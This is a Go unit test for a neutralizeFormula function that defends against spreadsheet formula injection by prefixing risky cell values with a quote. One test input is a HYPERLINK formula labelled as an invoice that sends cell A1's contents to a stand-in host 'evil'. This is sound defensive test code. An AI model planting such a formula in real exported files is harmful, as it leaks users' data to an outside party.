package handler

import "testing"

func TestNeutralizeFormula(t *testing.T) {
	cases := []struct {
		name string
		in   string
		want string
	}{
		{"等号公式", `=HYPERLINK("http://evil/leak?"&A1,"发票")`, `'=HYPERLINK("http://evil/leak?"&A1,"发票")`},
		{"加号", "+1+2", "'+1+2"},
		{"减号", "-恶意", "'-恶意"},
		{"at符号", "@SUM(A1)", "'@SUM(A1)"},
		{"制表符开头", "\tX", "'\tX"},
		{"普通中文", "山姆会员商店", "山姆会员商店"},
		{"空串", "", ""},
		{"中间含等号不处理", "满100-20=优惠", "满100-20=优惠"},
	}
	for _, c := range cases {
		t.Run(c.name, func(t *testing.T) {
			if got := neutralizeFormula(c.in); got != c.want {
				t.Fatalf("neutralizeFormula(%q) = %q, want %q", c.in, got, c.want)
			}
		})
	}
}
